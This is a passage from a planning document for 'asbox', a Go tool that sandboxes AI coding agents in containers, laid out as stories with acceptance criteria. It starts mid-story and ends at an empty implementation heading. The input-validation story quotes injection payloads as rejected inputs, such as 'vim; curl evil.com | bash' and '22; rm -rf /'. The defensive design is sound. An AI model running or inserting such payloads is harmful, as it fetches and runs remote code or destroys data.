So that I can work with Claude, Gemini, and Codex without rebuilding or editing config.

**Acceptance Criteria:**

**Given** a config with `installed_agents: [claude, gemini]`
**When** the sandbox image is built
**Then** both Claude Code and Gemini CLI are installed in the image

**Given** a config with `installed_agents: [claude, gemini]` and `default_agent: claude`
**When** the developer runs `asbox run`
**Then** the sandbox launches with Claude Code (`claude --dangerously-skip-permissions`)

**Given** a config with `installed_agents: [claude, gemini]`
**When** the developer runs `asbox run --agent gemini`
**Then** the sandbox launches with Gemini CLI (`gemini -y`), overriding the default

**Given** a config with `installed_agents: [claude]`
**When** the developer runs `asbox run --agent gemini`
**Then** the CLI exits with code 1: `"error: agent 'gemini' is not installed in the image. Installed agents: claude. Add it to installed_agents in config or choose a different agent"`

**Given** a config with `installed_agents: [claude, gemini]` and no `default_agent` set
**When** the developer runs `asbox run`
**Then** the first agent in the list (`claude`) is used as the default

**Given** agent names use short form (`claude`, `gemini`, `codex`)
**When** the config or CLI flag uses an old-style name (e.g., `claude-code`)
**Then** the CLI exits with code 1: `"error: unsupported agent 'claude-code'. Use 'claude', 'gemini', or 'codex'"`

**Given** `host_agent_config` is enabled (default) and agent is `claude`
**When** the sandbox launches and `~/.claude` exists on the host
**Then** `~/.claude` is mounted read-write at `/opt/claude-config` and `CLAUDE_CONFIG_DIR=/opt/claude-config` is set

**Given** `host_agent_config` is enabled (default) and agent is `gemini`
**When** the sandbox launches and `~/.gemini` exists on the host
**Then** `~/.gemini` is mounted read-write at `/opt/gemini-config` and `GEMINI_CONFIG_DIR=/opt/gemini-config` is set

**Given** `host_agent_config` is enabled and the host config directory does not exist (e.g., `~/.gemini` missing)
**When** the sandbox launches
**Then** the mount is silently skipped -- no error

**Given** `host_agent_config: false` in config
**When** the sandbox launches
**Then** no host agent config directory is mounted regardless of agent

**Given** Gemini CLI is selected as the agent
**When** the sandbox launches
**Then** Gemini CLI runs with `-y` flag (yolo mode, no permission prompts)

**Implementation Notes:**
- `internal/config/config.go` -- rename `Agent` to `DefaultAgent`, add `InstalledAgents []string`, change `HostAgentConfig` from `*MountConfig` to `*bool`, add `AgentConfigMapping` type and `AgentConfigRegistry`
- `internal/config/parse.go` -- validate `installed_agents` (required, all valid), validate `default_agent` is in list (default to first entry), remove `host_agent_config` source/target validation, add `ValidateAgent()` and `ValidateAgentInstalled()` exported functions, update `validAgents` to short names (`claude`, `gemini`, `codex`)
- `cmd/run.go` -- add `--agent` string flag, agent override logic after config parse, update `agentCommand()` for short names and gemini `-y`, replace `host_agent_config` MountConfig logic with boolean + `AssembleHostAgentConfig()`
- `internal/mount/mount.go` -- simplify `AssembleMounts()` (remove host_agent_config), add `AssembleHostAgentConfig(agent)` with registry lookup and tilde expansion
- `embed/Dockerfile.tmpl` -- iterate `InstalledAgents` for agent installation blocks
- `embed/config.yaml` -- restructure for `installed_agents`, `default_agent`, boolean `host_agent_config`
- Update all agent name references throughout codebase (`claude-code` -> `claude`, `gemini-cli` -> `gemini`). Add `codex` to validAgents, AgentConfigRegistry, agentCommand(), and Dockerfile template installation blocks.

### Story 1.10: Codex Agent Support

As a developer,
I want to install and run OpenAI Codex CLI as a sandboxed agent,
So that I can use Codex for autonomous coding tasks with the same isolation guarantees as Claude and Gemini.

**Acceptance Criteria:**

**Given** a config with `installed_agents: [codex]`
**When** the sandbox image is built
**Then** Codex CLI is installed via `npm install -g @openai/codex`

**Given** a config with `installed_agents: [claude, codex]` and `default_agent: codex`
**When** the developer runs `asbox run`
**Then** the sandbox launches with Codex CLI (`codex --dangerously-bypass-approvals-and-sandbox`)

**Given** a config with `installed_agents: [claude, gemini, codex]`
**When** the developer runs `asbox run --agent codex`
**Then** the sandbox launches with Codex CLI, overriding the default

**Given** `host_agent_config` is enabled (default) and agent is `codex`
**When** the sandbox launches and `~/.codex` exists on the host
**Then** `~/.codex` is mounted read-write at `/opt/codex-config` and `CODEX_HOME=/opt/codex-config` is set

**Given** `host_agent_config` is enabled and `~/.codex` does not exist on the host
**When** the sandbox launches with codex
**Then** the mount is silently skipped -- no error

**Given** a config with `installed_agents: [codex]`
**When** the sandbox image is built
**Then** `CODEX.md` agent instruction file is present in the sandbox user's home directory

**Given** codex is in `installed_agents`
**When** validating the config
**Then** `sdks.nodejs` must be set (codex requires Node.js, same validation as gemini)

**Implementation Notes:**
- `internal/config/config.go` -- add codex entry to `AgentConfigRegistry`: `{Source: "~/.codex", Target: "/opt/codex-config", EnvVar: "CODEX_HOME", EnvVal: "/opt/codex-config"}`
- `internal/config/parse.go` -- add `"codex": true` to `validAgents` map, add codex to nodejs requirement validation alongside gemini
- `cmd/run.go` -- add `"codex"` case to `agentCommand()` returning `"codex --dangerously-bypass-approvals-and-sandbox"`
- `embed/Dockerfile.tmpl` -- add codex installation block in the `{{range .InstalledAgents}}` section: `npm install -g @openai/codex` (same pattern as gemini)
- `embed/Dockerfile.tmpl` -- add codex case to agent instruction file copy: `CODEX.md`
- `embed/config.yaml` -- add codex as commented option in `installed_agents`

## Epic 2: Agent Can Work With Project Files and Git

An agent inside the sandbox can access mounted project files, use local git, install packages, and work with CLI tools and internet -- a complete development workflow minus Docker and MCP.

### Story 2.1: Host Directory Mounts and Secret Injection

As a developer,
I want to declare host directories and secrets in my config that are mounted/injected into the sandbox,
So that the agent can access my project files and API keys.

**Acceptance Criteria:**

**Given** a config with mounts `[{source: ".", target: "/workspace"}]`
**When** the sandbox launches
**Then** the host directory is mounted at `/workspace` inside the container via `-v` flag

**Given** mount source paths are relative
**When** asbox resolves mount paths
**Then** paths are resolved relative to the config file location, not the working directory

**Given** a mount source path that doesn't exist on the host
**When** the developer runs `asbox run`
**Then** the CLI exits with code 1 and prints `"error: mount source '<path>' not found (resolved to <absolute-path>). Check mounts in .asbox/config.yaml"`

**Given** a config declaring secrets `[ANTHROPIC_API_KEY]` and the variable is set in the host environment
**When** the sandbox launches
**Then** `ANTHROPIC_API_KEY` is available inside the container via `--env` flag

**Given** a declared secret is not set in the host environment
**When** the developer runs `asbox run`
**Then** the CLI exits with code 4 and prints `"error: secret 'ANTHROPIC_API_KEY' not set in host environment. Export it or remove from .asbox/config.yaml secrets list"`

**Given** a declared secret is set to empty string
**When** the sandbox launches
**Then** the empty value is passed through — empty is valid (`os.LookupEnv()`)

**Implementation Notes:**
- `internal/mount/mount.go` — `AssembleMounts(cfg *config.Config) ([]string, error)` returning `-v` flag strings
- `cmd/run.go` — secret validation via `os.LookupEnv()`, `--env` flag assembly, mount source existence check

### Story 2.2: Development Toolchain Verification

As a developer,
I want to verify that the sandbox provides a complete development environment with git, internet, CLI tools, and BMAD support,
So that the agent can do real development work without missing tools.

**Acceptance Criteria:**

**Given** a sandbox built from Epic 1 is running with a project directory mounted
**When** the agent runs git operations (add, commit, log, diff, branch, checkout, merge, amend)
**Then** all local git operations work identically to standard git (NFR10)

**Given** a sandbox is running with internet access
**When** the agent runs `curl`, `wget`, or `dig`
**Then** the commands succeed and can reach external hosts

**Given** the agent needs additional packages at runtime
**When** it runs `apt-get install`, `npm install`, or `pip install`
**Then** packages install successfully (container has internet and package managers)

**Given** a project with BMAD planning artifacts mounted
**When** the agent reads/writes to `_bmad-output/` or `docs/` directories
**Then** changes persist in the mounted host directory

**Implementation Notes:**
- This story validates that the Dockerfile template from Epic 1 (Stories 1.3-1.5) produces a working development environment
- No new Go code is created — this is a verification/acceptance story
- If any tool is missing, the fix is in `embed/Dockerfile.tmpl` (Story 1.3/1.5)
- Can be validated manually or as part of integration tests (Epic 9)

## Epic 3: Sandbox Enforces Isolation Boundaries

The sandbox enforces hard boundaries: git push is blocked, host filesystem is restricted, host credentials are inaccessible, and boundary violations return standard CLI error codes.

### Story 3.1: Git Push Blocking and Filesystem Isolation

As a developer,
I want the sandbox to block git push and restrict filesystem access to declared mounts,
So that the agent cannot accidentally push code or access host credentials.

**Acceptance Criteria:**

**Given** a sandbox is running with a mounted git repository that has a remote configured
**When** the agent runs `git push` (or any push variant)
**Then** the command fails with exit code 1 and prints `"fatal: Authentication failed"` to stderr

**Given** a sandbox is running
**When** the agent runs any other git command (add, commit, log, diff, branch, etc.)
**Then** the command passes through to `/usr/bin/git` and behaves identically to standard git

**Given** a config declares only `[{source: ".", target: "/workspace"}]` as a mount
**When** the agent attempts to access `~/.ssh`, `~/.aws`, or other host paths
**Then** those paths do not exist inside the container (NFR1, NFR6)

**Given** the agent attempts any operation outside the declared boundaries
**When** the operation fails
**Then** standard CLI error codes are returned (file not found, permission denied) — not sandbox-specific errors (FR37)

**Given** a sandbox image is built
**When** inspecting the image
**Then** `git-wrapper.sh` is at `/usr/local/bin/git` owned by root, not modifiable by the sandbox user (FR42)

**Implementation Notes:**
- Git wrapper implementation is in `embed/git-wrapper.sh` (written in Story 1.5)
- Filesystem isolation is inherent to container model — only declared mounts bridge host→container
- This story validates the isolation behavior; the implementation is in Stories 1.3/1.5 (Dockerfile template + git wrapper script)

## Epic 4: Agent Can Build and Run Docker Services

An agent can build Docker images, run multi-service applications with Docker Compose, and reach application ports — all inside the sandbox using Podman as a transparent Docker replacement.

### Story 4.1: Podman Installation and Docker Alias

As a developer,
I want Podman installed inside the sandbox with Docker aliased to it,
So that the agent can use familiar `docker` commands without knowing it's using Podman.

**Acceptance Criteria:**

**Given** a sandbox image is built
**When** the agent runs `docker --version` inside the container
**Then** Podman responds via the `podman-docker` alias package

**Given** the Dockerfile template
**When** inspecting the Podman installation
**Then** Podman 5.x is installed from upstream Kubic/OBS repository with `vfs` storage driver, `netavark` networking, `aardvark-dns`, and `file` events logger

**Given** the sandbox container is running
**When** the entrypoint starts the Podman API socket
**Then** `$DOCKER_HOST` points to `$XDG_RUNTIME_DIR/podman/podman.sock`, socket owned by sandbox user only

**Given** the sandbox container is running
**When** inspecting the outer container's runtime flags
**Then** it was NOT launched with `--privileged` and does NOT mount the host Docker socket (NFR4)

**Given** Testcontainers is used inside the sandbox
**When** inspecting the environment
**Then** Ryuk disabled, socket override configured, localhost host override set

**Implementation Notes:**
- Podman installation is in `embed/Dockerfile.tmpl` (written in Story 1.5)
- Podman API socket start is in `embed/entrypoint.sh` (written in Story 1.5)
- This story validates that the Podman setup from Story 1.5 works correctly for Docker-compatible operations
- If issues found, fix in Dockerfile template or entrypoint

### Story 4.2: Inner Container Building and Orchestration

As a developer,
I want the agent to build Docker images and run multi-service applications with Docker Compose,
So that the agent can test full-stack applications inside the sandbox.

**Acceptance Criteria:**

**Given** a sandbox is running with Podman available
**When** the agent runs `docker build -t myapp .` with a valid Dockerfile
**Then** the image builds successfully using Podman's rootless build

**Given** the agent has a docker-compose.yml defining multiple services
**When** the agent runs `docker compose up`
**Then** all services start and can communicate via aardvark-dns name resolution

**Given** an inner container exposes port 3000
**When** the agent runs `curl localhost:3000` from the sandbox
**Then** the request reaches the inner container's application (FR28)

**Given** inner containers are running
**When** attempting to reach their ports from outside the sandbox
**Then** the ports are not reachable — inner containers are on a private network bridge (NFR3, FR34, FR36)

**Given** Docker Compose v2 is installed
**When** the agent runs `docker compose version`
**Then** the version is displayed (plugin registered at `/usr/local/lib/docker/cli-plugins/docker-compose`)

**Implementation Notes:**
- Docker Compose plugin symlink is in `embed/Dockerfile.tmpl` (Story 1.5)
- Private network is inherent to Podman rootless networking
- This story validates inner container capabilities

## Epic 5: Agent Can Run Browser Tests via MCP

An agent can use MCP servers (Playwright with chromium + webkit) to run E2E browser tests including mobile device emulation against running applications inside the sandbox.

### Story 5.1: MCP Server Installation and Configuration Merge

As a developer,
I want MCP servers pre-installed in my sandbox image and automatically configured for the agent,
So that browser automation is available immediately without manual setup.

**Acceptance Criteria:**

**Given** a config with `mcp: [playwright]`
**When** the sandbox image is built
**Then** the Playwright MCP package is installed with chromium and webkit browser dependencies

**Given** MCP servers are installed at build time
**When** inspecting the image
**Then** a manifest at `/etc/sandbox/mcp-servers.json` lists all installed MCP servers

**Given** a sandbox starts with Playwright MCP installed
**When** the entrypoint runs
**Then** a `.mcp.json` is generated in the workspace root from the build-time manifest

**Given** the mounted project already has a `.mcp.json` with its own entries
**When** the entrypoint merges configs
**Then** sandbox servers are added; on name conflicts the project's version wins. Entrypoint logs added vs. skipped.

**Given** the agent needs mobile device emulation
**When** it uses Playwright MCP with webkit
**Then** webkit launches and supports iPhone/iPad device emulation (FR29a)

**Implementation Notes:**
- MCP installation blocks in `embed/Dockerfile.tmpl` (Story 1.5): `{{if .HasMCP "playwright"}}` conditional block
- MCP manifest written at build time: `echo '{"playwright": {...}}' > /etc/sandbox/mcp-servers.json`
- MCP merge logic in `embed/entrypoint.sh` (Story 1.5): reads manifest, merges with project `.mcp.json`
- Webkit: Use `npx playwright install --with-deps chromium webkit`. Validate via `ldd` against webkit binary. If `--with-deps` is insufficient, add explicit `apt-get install` for missing libs (GTK4, GStreamer, Wayland packages).

## Epic 6: Developer Can Isolate Platform Dependencies Automatically

The sandbox automatically detects and isolates `node_modules/` directories using named Docker volumes, preventing macOS-compiled native modules from crashing inside the Linux sandbox.

### Story 6.1: Auto Dependency Isolation via Named Volumes

As a developer,
I want the sandbox to automatically detect `package.json` files and isolate `node_modules/` with named Docker volumes,
So that macOS-compiled native modules don't crash inside the Linux sandbox.

**Acceptance Criteria:**

**Given** a config with `auto_isolate_deps: true` and a mount with `package.json` at the root
**When** the developer runs `asbox run`
**Then** a named volume mount is created (`-v asbox-myapp-node_modules:/workspace/node_modules`)

**Given** a monorepo with `package.json` at root, `packages/api/`, and `packages/web/`
**When** the sandbox launches with `auto_isolate_deps: true`
**Then** three named volume mounts are created with pattern `asbox-<project>-<path-dashed>-node_modules`

**Given** `auto_isolate_deps: true` and `bmad_repos` configured with repos containing `package.json` files
**When** the sandbox launches
**Then** named volume mounts are also created for each `node_modules/` in the bmad_repos, using container paths under `/workspace/repos/<basename>/`

**Given** `auto_isolate_deps: true` and `bmad_repos` with a monorepo containing nested `package.json` files
**When** the sandbox launches
**Then** all nested `node_modules/` directories within the bmad repo are isolated with named volumes

**Given** `auto_isolate_deps` is enabled
**When** the scan completes
**Then** summary is logged: `"auto_isolate_deps: scanned N mount paths, found M package.json files"` — where N includes both primary mounts and bmad_repos, even if M is zero

**Given** `auto_isolate_deps` is absent or `false`
**When** the sandbox launches
**Then** no scanning occurs, zero overhead

**Given** the container starts with named volume mounts
**When** the entrypoint runs
**Then** it `chown`s the volume mount directories for the unprivileged sandbox user

**Implementation Notes:**
- `internal/mount/isolate_deps.go` — `ScanDeps(cfg *config.Config) ([]ScanResult, error)` using `filepath.WalkDir`, excluding `node_modules/` subtrees. Scans both `cfg.Mounts` (using mount target for container paths) and `cfg.BmadRepos` (using `/workspace/repos/<basename>` for container paths).
- `internal/mount/isolate_deps_test.go` — table-driven tests with temp directories, including cases for bmad_repos paths
- Volume naming: `asbox-<project_name>-<relative-path-with-dashes>-node_modules`
- Called from `cmd/run.go` after config parse, before Docker run assembly
- Volume chown in `embed/entrypoint.sh` (written in Story 1.5) — no changes needed, already handles all paths in `AUTO_ISOLATE_VOLUME_PATHS`

## Epic 7: Developer Can Share Host Agent Authentication

A developer can mount their host agent config directory so the sandbox agent picks up existing OAuth tokens without re-authentication each session.

### Story 7.1: Host Agent Config Mount for OAuth Token Sync

As a developer,
I want the sandbox to automatically mount my host agent config directory based on the selected agent,
So that the agent picks up my existing authentication without re-login or manual path configuration.

**Acceptance Criteria:**

**Given** `host_agent_config` is not set in config (default: enabled) and agent is `claude`
**When** the sandbox launches and `~/.claude` exists on the host
**Then** `~/.claude` is mounted read-write at `/opt/claude-config` and `CLAUDE_CONFIG_DIR=/opt/claude-config` is set

**Given** `host_agent_config` is not set in config (default: enabled) and agent is `gemini`
**When** the sandbox launches and `~/.gemini` exists on the host
**Then** `~/.gemini` is mounted read-write at `/opt/gemini-config` and `GEMINI_CONFIG_DIR=/opt/gemini-config` is set

**Given** the host agent config directory contains valid OAuth tokens
**When** the agent refreshes tokens during a session
**Then** updated tokens are written back to the host directory via the read-write mount

**Given** `host_agent_config` is enabled and the host config directory does not exist
**When** the sandbox launches
**Then** the mount is silently skipped -- no error (agent not set up on host)

**Given** `host_agent_config: false` in config
**When** the sandbox launches
**Then** no host agent config directory is mounted regardless of agent

**Implementation Notes:**
- `internal/config/config.go` -- `AgentConfigRegistry` maps agent names to `{Source, Target, EnvVar}`
- `internal/mount/mount.go` -- `AssembleHostAgentConfig(agent)` resolves paths from registry, tilde expansion, validates directory exists
- `cmd/run.go` -- boolean check (`nil` = enabled, `true` = enabled, `false` = disabled), calls `AssembleHostAgentConfig()` with resolved agent name
- Known limitation (Phase 2): no integrity checking on config directory changes

## Epic 8: Developer Can Run Multi-Repo BMAD Workflows

A developer can configure multiple repositories that get auto-mounted into the sandbox with generated agent instructions, enabling multi-repo development workflows.

### Story 8.1: BMAD Multi-Repo Mounts and Agent Instructions

As a developer,
I want to configure multiple repositories that get auto-mounted with generated agent instructions,
So that the agent can work across multiple repos in a unified workspace.

**Acceptance Criteria:**

**Given** a config with `bmad_repos: [/Users/manuel/repos/frontend, /Users/manuel/repos/api]`
**When** the sandbox launches
**Then** each repo is mounted at `/workspace/repos/<basename>` (e.g., `/workspace/repos/frontend`, `/workspace/repos/api`)

**Given** `bmad_repos` is configured
**When** the system generates agent instructions
**Then** a CLAUDE.md (or GEMINI.md or CODEX.md) is generated from Go template with the repo list and instructions for git operations within `repos/`, mounted into the container

**Given** two repo paths resolve to the same basename
**When** the developer runs `asbox run`
**Then** the CLI exits with code 1: `"error: bmad_repos basename collision — 'client' resolves from both <path1> and <path2>. Rename one directory or use symlinks to disambiguate."`

**Given** a bmad_repos path that doesn't exist on the host
**When** the developer runs `asbox run`
**Then** the CLI exits with code 1: `"error: bmad_repos path '<path>' not found. Check bmad_repos in .asbox/config.yaml"`

**Given** `bmad_repos` is not configured
**When** the sandbox launches
**Then** no additional mounts or instruction files are created

**Implementation Notes:**
- `internal/mount/bmad_repos.go` — `AssembleBmadRepos(cfg *config.Config) (mounts []string, instructionFile string, error)`
- Collision check: map basenames, error if duplicate
- Path existence check before mount assembly
- `embed/agent-instructions.md.tmpl` — Go template with `{{range .BmadRepos}}` listing repos
- When bmad_repos active, runtime instruction file mounted over build-time FR44 file at same path

## Epic 9: Integration Test Suite Validates All Use Cases

Comprehensive integration tests verify sandbox lifecycle, mounts, secrets, isolation, inner containers, MCP, auto_isolate_deps, and bmad_repos with parallel Go test execution.

### Story 9.1: Integration Test Infrastructure

As a developer,
I want a testcontainers-go integration test framework with shared helpers and test fixtures,
So that I can write and run comprehensive sandbox tests.

**Acceptance Criteria:**

**Given** the integration test directory
**When** running `go test ./integration/... -v`
**Then** tests execute using testcontainers-go and produce clear pass/fail results

**Given** the test infrastructure
**When** inspecting test fixtures
**Then** fixtures include: a minimal `.asbox/config.yaml`, a small project directory with `package.json`, a git repo initialized with a remote, and a `docker-compose.yml` for inner container tests

**Given** multiple independent test cases
**When** tests run
**Then** they execute in parallel via `t.Parallel()` for faster feedback

**Implementation Notes:**
- `integration/integration_test.go` — shared setup: build test sandbox image, testcontainers config, helper functions (exec in container, check file exists, etc.)
- Test fixtures as embedded test data or created in `TestMain`
- `.github/workflows/ci.yml` — integration test step after unit tests

### Story 9.2: Lifecycle and Mount Tests

As a developer,
I want integration tests for sandbox build, run, auto-rebuild, mounts, and secrets,
So that core lifecycle functionality is validated automatically.

**Acceptance Criteria:**

**Given** a test config
**When** running lifecycle tests
**Then** `asbox build` produces a tagged image, `asbox run` starts a container that responds to exec, and the container stops cleanly

**Given** a test config with mounts
**When** running mount tests
**Then** host files are accessible inside the container at declared target paths, and writes from inside persist on the host

**Given** a test config with secrets set in the test environment
**When** running secret tests
**Then** declared secrets are available as env vars inside the container

**Given** a test config with a secret NOT set in the environment
**When** running secret validation tests
**Then** `asbox run` exits with code 4

**Implementation Notes:**
- `integration/lifecycle_test.go` — build, run, stop, auto-rebuild
- `integration/mount_test.go` — mount verification, secret injection, secret validation

### Story 9.3: Isolation and Inner Container Tests

As a developer,
I want integration tests for git push blocking, credential isolation, and inner Podman/Docker Compose,
So that security boundaries and inner container capabilities are validated.

**Acceptance Criteria:**

**Given** a running test sandbox with a git repo that has a remote
**When** running `git push` inside the container
**Then** the command fails with "Authentication failed" error

**Given** a running test sandbox
**When** checking for host credential paths (`.ssh`, `.aws`)
**Then** they do not exist inside the container

**Given** a running test sandbox with Podman
**When** running `docker build` with a simple Dockerfile and `docker compose up` with a simple service
**Then** the inner container builds, starts, and its port is reachable via curl from inside the sandbox

**Implementation Notes:**
- `integration/isolation_test.go` — git push block, credential absence
- `integration/inner_container_test.go` — Podman build, compose up, port reachability

### Story 9.4: MCP, Auto-Isolate-Deps, and BMAD Repos Tests

As a developer,
I want integration tests for MCP configuration, auto dependency isolation, and multi-repo mounts,
So that advanced features are validated automatically.

**Acceptance Criteria:**

**Given** a test sandbox built with `mcp: [playwright]`
**When** inspecting the container
**Then** `/etc/sandbox/mcp-servers.json` exists with Playwright entry and `.mcp.json` is generated in the workspace

**Given** a test config with `auto_isolate_deps: true` and a project with `package.json`
**When** the sandbox launches
**Then** a named volume mount is created for `node_modules/`

**Given** a test config with `bmad_repos` pointing to two test directories
**When** the sandbox launches
**Then** repos are mounted at `/workspace/repos/<name>` and agent instruction file is present in the container

**Implementation Notes:**
- `integration/mcp_test.go` — manifest presence, .mcp.json generation
- `integration/isolate_deps_test.go` — named volume creation verification (check via `docker inspect`)
- `integration/bmad_repos_test.go` -- mount verification, instruction file presence

### Story 9.5: Multi-Agent Config and Flag Tests

As a developer,
I want integration tests for the multi-agent configuration, --agent flag override, and boolean host_agent_config,
So that agent switching and config resolution are validated automatically.

**Acceptance Criteria:**

**Given** a test config with `installed_agents: [claude, gemini]`
**When** the sandbox image is built
**Then** both `claude` and `gemini` CLI commands are available inside the container

**Given** a test config with `installed_agents: [claude, gemini]` and `default_agent: claude`
**When** the sandbox launches without `--agent` flag
**Then** the agent command is `claude --dangerously-skip-permissions`

**Given** a test config with `installed_agents: [claude, gemini]`
**When** the sandbox launches with `--agent gemini`
**Then** the agent command is `gemini -y`

**Given** a test config with `installed_agents: [claude]`
**When** `--agent gemini` is passed
**Then** the CLI exits with code 1 with a clear error about gemini not being installed

**Given** a test config with `host_agent_config: true` (or default)
**When** the sandbox launches with a valid host agent config directory
**Then** the directory is mounted and the appropriate env var is set

**Given** a test config with `host_agent_config: false`
**When** the sandbox launches
**Then** no host agent config mount is present

**Implementation Notes:**
- `integration/multi_agent_test.go` -- agent flag override, installed_agents validation, host_agent_config boolean
- Config parsing unit tests in `internal/config/parse_test.go` -- short names, installed_agents validation, default_agent resolution

### Story 9.6: Codex Agent Config and Runtime Tests

As a developer,
I want integration tests for codex agent configuration, installation, and runtime behavior,
So that codex support is validated alongside claude and gemini.

**Acceptance Criteria:**

**Given** a test config with `installed_agents: [claude, codex]`
**When** the sandbox image is built
**Then** both `claude` and `codex` CLI commands are available inside the container

**Given** a test config with `installed_agents: [codex]` and `default_agent: codex`
**When** the sandbox launches
**Then** the agent command is `codex --dangerously-bypass-approvals-and-sandbox`

**Given** a test config with `installed_agents: [claude, gemini, codex]`
**When** the sandbox launches with `--agent codex`
**Then** the agent command is `codex --dangerously-bypass-approvals-and-sandbox`

**Given** a test config with `installed_agents: [claude]`
**When** `--agent codex` is passed
**Then** the CLI exits with code 1 with a clear error about codex not being installed

**Given** a test config with `host_agent_config: true` and agent is `codex`
**When** the sandbox launches with a valid `~/.codex` directory
**Then** the directory is mounted and `CODEX_HOME` env var is set

**Given** a test config with `installed_agents: [codex]` and the `CODEX.md` instruction file
**When** inspecting the container
**Then** `CODEX.md` is present in the sandbox user's home directory

**Implementation Notes:**
- Extend `integration/multi_agent_test.go` with codex-specific test cases
- Config parsing unit tests in `internal/config/parse_test.go` -- codex in validAgents, nodejs requirement validation
- `internal/mount/mount_test.go` -- codex entry in AssembleHostAgentConfig tests

## Epic 10: Remove Legacy Bash Implementation

Remove all files from the original bash sandbox implementation that have been fully replaced by the Go rewrite. Update documentation to reflect the Go project structure.

### Story 10.1: Remove Bash Sandbox Files and Update README

As a developer,
I want the legacy bash sandbox files removed and the README updated to reflect the Go CLI,
So that the repository contains only the canonical Go implementation with accurate documentation.

**Acceptance Criteria:**

**Given** the Go rewrite is complete (all Epics 1-9 stories done)
**When** the cleanup story is executed
**Then** the following files/directories are deleted:
- `sandbox.sh` (original bash CLI entry point)
- `scripts/` (bash entrypoint.sh, git-wrapper.sh, healthcheck-poller.sh, agent-instructions.md)
- `tests/` (bash integration test suite and fixtures)
- `Dockerfile.template` (bash-era Dockerfile template)
- `podman/` (empty leftover directory)

**Given** the bash files are removed
**When** inspecting the repository
**Then** no remaining file outside `_bmad-output/` references the deleted files as current/active code

**Given** the README.md currently documents the bash implementation
**When** the cleanup story is executed
**Then** README.md is rewritten to document the Go CLI:
- Installation via single binary (not `ln -s sandbox.sh`)
- `asbox` command reference (not `sandbox` command)
- Go project structure (`cmd/`, `internal/`, `embed/`, `integration/`)
- `go test` for testing (not `bash tests/test_sandbox.sh`)
- Build caching via content-hash (referencing Go implementation)
- Remove all references to `sandbox.sh`, `Dockerfile.template`, `scripts/`, `tests/`

**Implementation Notes:**
- Pure deletion + documentation rewrite — no Go code changes
- Historical references in `_bmad-output/` implementation artifacts are left intact (they document the migration journey)
- The `Makefile` has no bash references and needs no changes

## Epic 11: Hardening for Production Readiness

A developer can run concurrent sandbox sessions, use asbox in CI/CD pipelines, and trust that all configuration inputs are validated against injection risks, with reproducible image builds via pinned dependencies and safe agent command execution.

### Story 11.1: Concurrent Sandbox Sessions

As a developer,
I want to run multiple sandbox sessions simultaneously against the same or different projects,
So that I can delegate tasks to multiple agents in parallel without container name collisions.

**Acceptance Criteria:**

**Given** a developer runs `asbox run` for a project
**When** the container is created
**Then** the container name uses the pattern `asbox-<project>-<suffix>` where `<suffix>` is a short random string (e.g., 6 hex chars), ensuring uniqueness across concurrent runs

**Given** a developer runs two `asbox run` commands for the same project simultaneously
**When** both containers start
**Then** both sessions launch successfully with distinct container names and no conflict error

**Given** a developer runs `asbox run` and then exits with Ctrl+C
**When** the session ends
**Then** the container with the random-suffixed name is removed cleanly, and `docker ps -a` shows no orphaned asbox containers for that session

**Given** a developer runs two concurrent sandbox sessions
**When** both sessions exit (via Ctrl+C or normal termination)
**Then** both containers are removed and no orphaned containers or networks remain

**Given** the container naming scheme has changed from deterministic to random-suffixed
**When** existing scripts or workflows reference the old `asbox-<project>` name
**Then** the `asbox-<project>` prefix is preserved as the first part of the name, maintaining greppability and log identification

**Implementation Notes:**
- Modify `internal/docker/run.go` to append a random suffix (e.g., `crypto/rand` hex) to the container name
- Container name pattern: `asbox-<project>-<6-char-hex>`
- Ensure `docker rm -f` in cleanup uses the actual container name returned by Docker, not a reconstructed name
- Update any container name references in `cmd/run.go`

### Story 11.2: SDK, Package, and Project Name Sanitization

As a developer,
I want asbox to validate SDK versions, package names, and project names in my config,
So that malformed or malicious values cannot inject shell commands into the generated Dockerfile.

**Acceptance Criteria:**

**Given** a config.yaml with an SDK version containing shell metacharacters (e.g., `nodejs: "22; rm -rf /"`)
**When** asbox parses the config via `config.Parse()`
**Then** the CLI exits with code 1 and prints an error identifying the invalid SDK version and the allowed character set

**Given** a config.yaml with a valid SDK version (e.g., `nodejs: "22"`, `python: "3.12"`, `go: "1.23.1"`)
**When** asbox parses the config
**Then** the version is accepted — allowed characters: digits, dots, hyphens, plus signs (semver-compatible)

**Given** a config.yaml with a package name containing shell metacharacters (e.g., `packages: ["vim; curl evil.com | bash"]`)
**When** asbox parses the config
**Then** the CLI exits with code 1 and prints an error identifying the invalid package name

**Given** a config.yaml with an empty string in the packages list (e.g., `packages: ["", "vim"]`)
**When** asbox parses the config
**Then** the CLI exits with code 1 and prints an error rejecting empty package names

**Given** a config.yaml with `project_name: "my-project; rm -rf /"` (explicitly set, not derived)
**When** asbox parses the config
**Then** the explicit `project_name` is sanitized through the same `sanitizeProjectName()` logic as derived names, and invalid characters are stripped or rejected

**Given** a config.yaml with valid package names (e.g., `packages: ["vim", "build-essential", "libpq-dev"]`)
**When** asbox parses the config
**Then** all package names are accepted — allowed characters: alphanumeric, hyphens, dots, plus signs, colons (apt package name format)

**Implementation Notes:**
- Add `validateSDKVersion()` in `internal/config/parse.go` — regex: `^[0-9a-zA-Z.\-+]+$`
- Add `validatePackageName()` — regex: `^[a-zA-Z0-9][a-zA-Z0-9.\-+:]*$`
- Apply `sanitizeProjectName()` to explicit `project_name` values, not just derived ones
- All validation happens in `Parse()` before any downstream consumers see the values

### Story 11.3: ENV Key/Value Validation

As a developer,
I want asbox to validate environment variable keys and values in my config,
So that malformed ENV entries cannot inject arbitrary Dockerfile directives.

**Acceptance Criteria:**

**Given** a config.yaml with an ENV key containing spaces (e.g., `env: {"MY VAR": "value"}`)
**When** asbox parses the config
**Then** the CLI exits with code 1 and prints an error identifying the invalid ENV key and the allowed format

**Given** a config.yaml with an ENV key starting with a digit (e.g., `env: {"1VAR": "value"}`)
**When** asbox parses the config
**Then** the CLI exits with code 1 and prints an error — ENV keys must start with a letter or underscore

**Given** a config.yaml with valid ENV keys (e.g., `env: {"MY_VAR": "value", "DEBUG": "true", "_INTERNAL": "1"}`)
**When** asbox parses the config
**Then** all keys are accepted — allowed format: `^[a-zA-Z_][a-zA-Z0-9_]*$`

**Given** a config.yaml with an ENV value containing a newline (via YAML multiline string)
**When** asbox parses the config
**Then** the CLI exits with code 1 and prints an error — newlines in ENV values could inject Dockerfile directives

**Given** a config.yaml with normal ENV values including quotes, equals signs, and spaces (e.g., `env: {"DSN": "host=localhost dbname=test"}`)
**When** asbox parses the config
**Then** the values are accepted — only newlines and null bytes are rejected in values

**Implementation Notes:**
